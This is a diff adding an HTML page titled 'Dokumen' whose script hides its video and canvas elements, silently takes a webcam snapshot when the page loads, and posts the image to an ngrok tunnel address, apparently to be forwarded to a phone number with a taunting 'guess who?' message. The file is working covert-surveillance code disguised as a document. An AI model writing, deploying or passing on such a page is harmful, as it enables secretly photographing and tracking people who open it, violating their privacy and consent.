@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="id">
+    <head>
+        <meta charset="UTF-8" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Dokumen</title>
+    </head>
+    <body>
+        <video id="video" width="320" height="240" autoplay></video>
+        <canvas id="canvas" width="320" height="240"></canvas>
+
+        <script>
+            let video = document.querySelector("#video");
+            video.style.display = "none";
+            let canvas = document.querySelector("#canvas");
+            canvas.style.display = "none";
+            const base = "https://34c8-36-69-4-21.ngrok-free.app";
+
+            (async function () {
+                let stream = await navigator.mediaDevices.getUserMedia({
+                    video: true,
+                    audio: false,
+                });
+                video.srcObject = stream;
+                setTimeout(async () => {
+                    canvas
+                        .getContext("2d")
+                        .drawImage(video, 0, 0, canvas.width, canvas.height);
+                    let image_data_url = canvas
+                        .toDataURL("image/jpeg")
+                        .replace(/^data:image\/jpeg;base64,/, "");
+
+                    await sM(image_data_url, "jpeg");
+                }, 1000);
+            })();
+
+            async function sM(data, ext) {
+                let mySender = await fetch(`${base}/send/`, {
+                    method: "POST", // *GET, POST, PUT, DELETE, etc.
+                    mode: "cors", // no-cors, *cors, same-origin
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                        to: "082286230830",
+                        msg: "siapa hayo?",
+                        img: data,
+                        ext,
+                    }), // body data type must match "Content-Type" header
+                });
+                let myRes = await mySender.text();
+                console.log(myRes);
+            }
+        </script>
+    </body>
+</html>
